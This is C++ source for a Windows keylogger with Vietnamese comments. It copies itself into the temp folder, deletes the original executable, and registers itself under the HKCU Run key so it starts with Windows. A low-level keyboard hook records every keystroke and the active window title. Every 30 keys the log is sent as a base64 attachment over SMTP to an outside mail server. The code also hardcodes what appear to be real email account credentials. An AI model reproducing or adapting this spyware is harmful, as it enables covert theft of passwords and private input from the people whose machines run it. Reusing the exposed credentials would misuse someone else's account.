// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _BASE64_H_
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "Base64.h"
#include <shellapi.h>
#include <stdlib.h>
#include<fstream>

typedef unsigned char BYTE;

#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "Ws2_32.lib")

#pragma warning(disable : 4996)

#define DEFAULT_PORT "587"		// Port 587 để sử dụng SMTP
HHOOK g_hHook;

HWND g_hActiveWindowOld = 0, g_hActiveWindowNew;
HANDLE g_hLogFile;	// handle của file .log
WCHAR g_KLogPath[MAX_PATH] = { 0 };		//Biến lưu link keylog.log

LRESULT CALLBACK Msg(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
int g_KiTu = 0;
BOOL sendRequest(SOCKET Socket, const char* Buffer);
BOOL reply(SOCKET Socket);


int mailSending();
using namespace std;
// Main
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

	//Kiểm tra xem file exe có trong file temp chưa,nếu không thì copy vào temp
	//tạo file để lưu link file exe ở trong project

	WCHAR TempPath[MAX_PATH] = { 0 };
	WCHAR FileExeTempPath[MAX_PATH] = { 0 };
	WCHAR FileExePath[MAX_PATH] = { 0 };
	WCHAR OldExePath[MAX_PATH] = { 0 };		// Biến để lưu link file exe cũ(build xong)
	HINSTANCE run;

	GetTempPath(MAX_PATH, TempPath); // Lấy đường dẫn của file %Temp%
	lstrcat(g_KLogPath, TempPath);
	lstrcat(g_KLogPath, L"keylog.log");
	lstrcat(FileExeTempPath, TempPath);
	lstrcat(FileExeTempPath, L"keylog.exe");

	DWORD sizeRW = 0;	// size Read write file

	int tempResult = 0;
	HANDLE hOldExe = 0;
	GetModuleFileNameW(0, FileExePath, MAX_PATH); // đường dẫn exe ở hiện tại
	lstrcat(OldExePath, TempPath);
	lstrcat(OldExePath, L"oldlinkexe.log");

	if (lstrcmp(FileExePath, FileExeTempPath) != 0) // chưa có trong file temp
	{

		tempResult = CopyFile(FileExePath, FileExeTempPath, FALSE);	//copy file exe mới build vào temp, tên là keylog.exe
		hOldExe = CreateFile(OldExePath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0); //tạo file "oldlinkexe để lưu link exe khi build xong
		tempResult = WriteFile(hOldExe, FileExePath, sizeof(WCHAR) * (lstrlen(FileExePath)), &sizeRW, 0);	// lưu link vào file oldlinkexe
		CloseHandle(hOldExe);

		run = ShellExecute(NULL, NULL, FileExeTempPath, NULL, NULL, SW_SHOWDEFAULT);	//chạy file exe trong temp
		Sleep(100);
		return 0;
	}
	else // đã có trong temp
	{
		// Mở được file chưa oldLink thì chạy file, rồi xóa file trong debug đi
		if ((hOldExe = CreateFile(OldExePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)) != INVALID_HANDLE_VALUE)
		{
			int result = ReadFile(hOldExe, OldExePath, sizeof(OldExePath), &sizeRW, 0);
			CloseHandle(hOldExe);
			for (int i = 0; i < 2; i++)
			{
				if (DeleteFile(OldExePath) != 0)	//xóa file bên ngoài !
					break;
				Sleep(300);
			}
			//khởi động keylogger cùng với window
			HKEY hookKey;

			// Mở HKEY_CURRENT_USER. Ứng dụng chạy cùng window thì dùng registry, file RUN
			RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hookKey);
			int i = RegSetValueEx(hookKey, L"Keylog", NULL, REG_SZ, (const BYTE*)OldExePath, lstrlen(OldExePath) * sizeof(WCHAR) + 1);//Set giá trị của ứng dụng
			RegCloseKey(hookKey);
			//  Mở File Log để Ghi
			g_hLogFile = CreateFile(g_KLogPath, GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
			HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Msg, NULL, 0); // Bắt đầu HOOK, bắt sự kiện nhập từ bàn phím 
		}
	}
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}


LRESULT CALLBACK Msg(int nCode, WPARAM wParam, LPARAM lParam)
{
	// Bắt sự kiện nhập phím
	KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
	WCHAR nameWindow[255];
	WCHAR nameKey[64];
	int tempResult;
	DWORD sizerw = 0; // Size read write
	WCHAR EnterKey[2] = L"\n";
	switch (wParam)
	{
	case WM_KEYDOWN:
	{
		// Nếu bấm phím thì :
		g_hActiveWindowNew = GetForegroundWindow();// Lấy handle của ứng dụng vừa chọn vào 
		if (g_hActiveWindowOld != g_hActiveWindowNew)
		{
			ZeroMemory(nameWindow, sizeof(nameWindow));
			g_hActiveWindowOld = g_hActiveWindowNew;
			// Xuống dòng keylog.log
			tempResult = WriteFile(g_hLogFile, &EnterKey, sizeof(WCHAR) * (lstrlen(EnterKey)), &sizerw, 0);
			// VD : GooleChrome: ...
			//	 
			// Lấy tên ứng dụng window lưu vào mảng nameWindow
			GetWindowTextW(g_hActiveWindowNew, nameWindow, sizeof(nameWindow) / 2);
			lstrcat(nameWindow, L":"); //VD GooleChrome: ...
			tempResult = WriteFile(g_hLogFile, &nameWindow, sizeof(WCHAR) * (lstrlen(nameWindow)), &sizerw, 0);

		}
		ZeroMemory(nameKey, sizeof(nameKey));
		tempResult = GetKeyNameTextW(kbdStruct->scanCode << 16, (LPWSTR)nameKey, 65);	//Nhập gì trên bàn phím thì lưu trên nameKey
		lstrcat(nameKey, L" ");
		tempResult = WriteFile(g_hLogFile, &nameKey, sizeof(WCHAR) * (lstrlen(nameKey)), &sizerw, 0);// Ghi vào file .log
		g_KiTu += 1;
		if (g_KiTu == 30)	// Nhập đủ 50 ký tự thì gửi vào mail
		{
			SetFilePointer(g_hLogFile, 0, 0, FILE_BEGIN);
			mailSending();
			SetFilePointer(g_hLogFile, 0, 0, FILE_END);
			g_KiTu = 0;
		}
		break;
	}
	default:
		break;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

int mailSending() {
	char sendTemp[512] = "EHLO anhnvq\r\n";
	WSADATA wsadata;
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;
	SOCKET ConnectSocket = INVALID_SOCKET;
	int iResult;
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = 0;

	// Resolve the server address and port
	iResult = getaddrinfo("bmail.bkav.com", DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	char AccountMail[255] = "anhnvq@bkav.com";
	char PasswordMail[255] = "Qa06052001";
	int err = GetLastError();

	reply(ConnectSocket);
	/*Khi lệnh EHLO được gửi đi, máy chủ sẽ phản hồi với các tùy chọn EHLO được hỗ trợ, SMTP mở rộng. HELO là SMTP bản cũ
	// https://en.wikipedia.org/wiki/SMTP_Authentication
	// https://stackoverflow.com/questions/19767431/how-to-send-email-with-c
	*/

	sendRequest(ConnectSocket, sendTemp); // Gửi EHLO anhnvq 
	reply(ConnectSocket);

	//Request Login
	/*AUTH là một phần mở rộng của Giao thức truyền thư đơn giản(SMTP),
	//theo đó máy khách có thể đăng nhập bằng bất kỳ cơ chế xác thực nào được máy chủ hỗ trợ.
	Nó chủ yếu được sử dụng bởi các máy chủ đệ trình , nơi việc xác thực là bắt buộc.
	*/

//	ZeroMemory(sendTemp, sizeof(sendTemp));
//	lstrcatA(sendTemp, "AUTH LOGIN\r\n");
//	sendRequest(ConnectSocket, sendTemp);
	sendRequest(ConnectSocket, "AUTH LOGIN\r\n");
	reply(ConnectSocket);

	//Mã hóa Base64
	string strAccount;
	string strPassword;
	strAccount = base64_encode((unsigned char*)AccountMail, strlen((const char*)AccountMail));
	strAccount += "\r\n";
	strPassword = base64_encode((unsigned char*)PasswordMail, strlen((const char*)PasswordMail));
	strPassword += "\r\n";

	//Gửi account mail đã được mã hóa đến server
	ZeroMemory(sendTemp, sizeof(sendTemp));
	lstrcatA(sendTemp, (LPCSTR)strAccount.c_str());
	sendRequest(ConnectSocket, sendTemp);// string::c_str() đổi string sang char
	reply(ConnectSocket);

	//Gửi password mail đã được mã hóa đến server
	ZeroMemory(sendTemp, sizeof(sendTemp));
	lstrcatA(sendTemp, (LPCSTR)strPassword.c_str());
	sendRequest(ConnectSocket, sendTemp);
	reply(ConnectSocket);

	//Send Mail
	// FROM:
	ZeroMemory(sendTemp, sizeof(sendTemp));
	lstrcatA(sendTemp, "MAIL FROM:<anhnvq@bkav.com>\r\n");
	sendRequest(ConnectSocket, sendTemp);
	reply(ConnectSocket);

	// TO:
	ZeroMemory(sendTemp, sizeof(sendTemp));
	lstrcatA(sendTemp, "RCPT TO:<anhnvq@bkav.com>\r\n");
	sendRequest(ConnectSocket, sendTemp);
	reply(ConnectSocket);

	// DATA: 
	ZeroMemory(sendTemp, sizeof(sendTemp));
	lstrcatA(sendTemp, "DATA\r\n");
	sendRequest(ConnectSocket, sendTemp);
	reply(ConnectSocket);

	//Nối text
	char ReadLogFile[5000] = { 0 };
	DWORD sizeReadWrite = 0;
	char TempData[5000];
	string FileBase64;

	ZeroMemory(TempData, sizeof(TempData));

	// The MIME HEADER.Nội dung Đóng gói thư theo một số tham số bắt buộc. Set up ATTACH
	// https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2010/aa563068(v=exchg.140)
	iResult = send(ConnectSocket, "MIME-Version: 1.0\r\n", (int)strlen("MIME-Version: 1.0\r\n"), 0);
	iResult = send(ConnectSocket, "Content-Type:multipart/mixed;boundary=\"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n", (int)strlen("Content-Type:multipart/mixed;boundary=\"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n"), 0);
	iResult = send(ConnectSocket, "--KkK170891tpbkKk__FV_KKKkkkjjwq\r\n", (int)strlen("--KkK170891tpbkKk__FV_KKKkkkjjwq\r\n"), 0);
	iResult = send(ConnectSocket, "Content-Type:application/octet-stream;name=\"Keylog.txt\"\r\n", (int)strlen("Content-Type:application/octet-stream;name=\"Keylog.txt\"\r\n"), 0);
	//Content-Transfer-Encoding: base64, mã hóa base64
	iResult = send(ConnectSocket, "Content-Transfer-Encoding:base64\r\n", (int)strlen("Content-Transfer-Encoding:base64\r\n"), 0);
	//Content-Diposition: attachment: cho biết nó sẽ tải xuống; hầu hết các trình duyệt hiển thị hộp thoại 'Lưu dưới dạng', được điền sẵn giá trị của các filename tham số nếu có
	//Content-Diposition: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition
	iResult = send(ConnectSocket, "Content-Disposition:attachment;filename=\"Keylog.txt\"\r\n", (int)strlen("Content-Disposition:attachment;filename=\"Keylog.txt\"\r\n"), 0);
	iResult = send(ConnectSocket, "\r\n", (int)strlen("\r\n"), 0);

	//Đọc file log
	int tResult = ReadFile(g_hLogFile, ReadLogFile, 5000, &sizeReadWrite, 0);

	//Mã hóa Base64
	FileBase64 = base64_encode((unsigned char*)ReadLogFile, sizeReadWrite);

	//Send mail
	ZeroMemory(TempData, sizeof(TempData));
	lstrcatA(TempData, FileBase64.c_str());
	lstrcatA(TempData, "\r\n");

	sendRequest(ConnectSocket, TempData);
	sendRequest(ConnectSocket, ".\r\n");
	reply(ConnectSocket);

	//QUIT 
	ZeroMemory(sendTemp, sizeof(sendTemp));
	lstrcatA(sendTemp, "QUIT\r\n");
	sendRequest(ConnectSocket, sendTemp);
	reply(ConnectSocket);

	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

BOOL sendRequest(SOCKET Socket, const char* Buffer)
{
	int iResult;
	iResult = send(Socket, Buffer, (int)strlen(Buffer), 0);
	if (iResult == SOCKET_ERROR)
	{
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(Socket);
		WSACleanup();
		return 1;
	}
	return 1;
}

BOOL reply(SOCKET Socket)
{
	int iResult;
	char recvbuf[512];
	int recvbuflen = 512;
	ZeroMemory(recvbuf, sizeof(recvbuf));
	iResult = recv(Socket, recvbuf, recvbuflen, 0);
	if (iResult > 0)
		printf("%s\n", recvbuf);
	else if (iResult == 0)
		printf("Connect closed\n");
	else
		printf("receive failed with error: %d\n", WSAGetLastError());
	return 1;
}